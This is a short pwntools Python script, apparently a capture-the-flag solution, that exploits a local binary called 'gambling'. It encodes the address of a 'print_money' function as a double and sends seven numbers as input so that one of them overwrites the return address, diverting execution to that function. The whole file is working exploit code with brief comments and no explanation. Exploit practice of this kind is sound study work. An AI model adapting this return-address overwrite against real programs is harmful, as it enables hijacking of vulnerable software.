from pwn import *
import struct

context.binary = elf = ELF("./gambling")
context.log_level = 'debug'

def addr_to_double(addr):
    # Pack the address as a double (8-byte value) using little-endian format
    return struct.unpack('<d', struct.pack('<II', addr, 0x0))[0]

# Start the process
p = process(elf.path)

# Address of the win function (make sure this is the correct address)
print_money = elf.symbols['print_money']  # Confirm the address is correct with gdb

# Craft the payload with 7 doubles
payload = [
    1.1, 2.2, 3.3, 4.4, 5.5, 
    addr_to_double(print_money),  # f[5] will overwrite the return address
    0.0  # Padding to complete the 7th double
]

# Convert the payload to a string of doubles
payload_str = ' '.join(map(str, payload))

# Send the payload
p.sendlineafter(b"Enter your lucky numbers: ", payload_str.encode())

# Get the result
p.interactive()
